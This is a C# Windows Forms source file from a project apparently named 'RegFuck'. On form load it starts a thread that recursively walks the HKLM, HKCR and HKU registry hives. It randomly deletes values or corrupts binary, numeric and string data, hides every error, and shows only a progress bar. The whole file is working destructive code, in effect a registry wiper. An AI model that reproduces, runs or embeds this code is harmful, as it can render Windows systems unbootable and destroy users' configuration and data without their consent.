using Microsoft.Win32;
using System;
using System.Threading;
using System.Windows.Forms;

namespace RegFuck
{
    public partial class Form2 : Form
    {
        double damage = 0;
        public Form2(double damage)
        {
            this.damage = damage;
            InitializeComponent();
        }

        private int progress;
        private int max;

        private Random rng = new Random(Form4.seed);

        public void fuckReg(RegistryKey key, double dm)
        {
            foreach (var k in key.GetSubKeyNames())
            {
                try
                {
                    fuckReg(key.OpenSubKey(k, true), dm);
                } catch (Exception) { }
            }

            foreach (var v in key.GetValueNames())
            {
                try
                {
                    if (rng.NextDouble() <= damage * Form4.del * dm)
                    {
                        key.DeleteValue(v);
                    }
                    else
                    {
                        corruptReg(key, v, dm);
                    }
                }
                catch (Exception) { }

                progress++;
                if (progress % Math.Ceiling(max / 100.0) == 0)
                {
                    progressBar1.Invoke((MethodInvoker)delegate () { progressBar1.Value = (int)(progress * 100.0 / max); });
                }
            }
        }

        public int countReg(RegistryKey key)
        {
            int i = key.ValueCount;

            foreach (var k in key.GetSubKeyNames())
            {
                try
                {
                    i += countReg(key.OpenSubKey(k, true));
                }
                catch (Exception) { }
            }

            return i;
        }

        public void corruptReg(RegistryKey key, string value, double dm)
        {
            var v = key.GetValue(value, null, RegistryValueOptions.DoNotExpandEnvironmentNames);
            
            switch (key.GetValueKind(value))
            {
                case RegistryValueKind.Binary:
                    byte[] arr = (byte[])v;
                    for (int i = 0; i < arr.Length; i++)
                    {
                        if (rng.NextDouble() <= damage*dm)
                        {
                            arr[i] = (byte)rng.Next(0, 256);
                        }
                    }
                    break;

                case RegistryValueKind.DWord:
                case RegistryValueKind.QWord:
                    if (rng.NextDouble() <= damage*dm)
                        v = rng.Next();

                    break;

                case RegistryValueKind.String:
                case RegistryValueKind.ExpandString:
                    v = corruptString((string)v, dm);
                    break;

                case RegistryValueKind.MultiString:
                    string[] strs = (string[])v;

                    for (int i = 0; i < strs.Length; i++)
                    {
                        strs[i] = corruptString(strs[i], dm);
                    }

                    break;
            }

            key.SetValue(value, v, key.GetValueKind(value));
        }

        public string corruptString(string str, double dm)
        {
            string n = "";

            foreach (char c in str)
            {
                if (rng.NextDouble() <= damage*dm)
                    n += (char)rng.Next(32, 127);
                else
                    n += c;
            }

            return n;
        }

        public void fuck()
        {
            max += countReg(Registry.LocalMachine);
            max += countReg(Registry.ClassesRoot);
            max += countReg(Registry.Users);

            fuckReg(Registry.LocalMachine, Form4.hklm);
            fuckReg(Registry.ClassesRoot, Form4.hkcr);
            fuckReg(Registry.Users, Form4.hku);

            Invoke((MethodInvoker) delegate() {
                new Form3().Show();
                Hide();
            });
        }

        private void Form2_Load(object sender, EventArgs e)
        {
            new Thread(fuck).Start();
        }
    }
}
